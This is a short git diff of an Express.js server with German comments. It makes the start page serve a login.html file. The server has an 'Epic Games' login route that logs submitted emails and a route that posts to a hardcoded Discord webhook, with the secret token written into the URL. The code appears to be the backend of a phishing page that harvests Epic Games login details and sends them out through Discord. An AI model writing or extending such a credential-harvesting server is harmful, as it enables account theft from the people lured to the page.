@@ -15,10 +15,15 @@ app.use((req, res, next) => {
 
 app.use(express.json());
 
-// 1️⃣ STATISCHE DATEIEN (HTML, CSS, JS)
+// 1️⃣ STATISCHE DATEIEN (CSS, JS, Bilder)
 app.use(express.static('public'));
 
-// 2️⃣ API ENDPUNKT /login
+// 2️⃣ STARTSEITE = login.html
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+// 3️⃣ API: Login an Epic Games
 app.post('/api/login', async (req, res) => {
   try {
     console.log('Login:', req.body.email);
@@ -43,7 +48,7 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-// 3️⃣ Discord Webhook
+// 4️⃣ API: Discord Webhook
 app.post('/api/discord', async (req, res) => {
   try {
     await fetch('https://discord.com/api/webhooks/1475273263893708882/VxC_RmWwlmGk5xsX50-c8hSOWBlvX3WVEa8rg9ezCzFUzCU4eyCYyP_Tx5jyi0zFVRXK', {
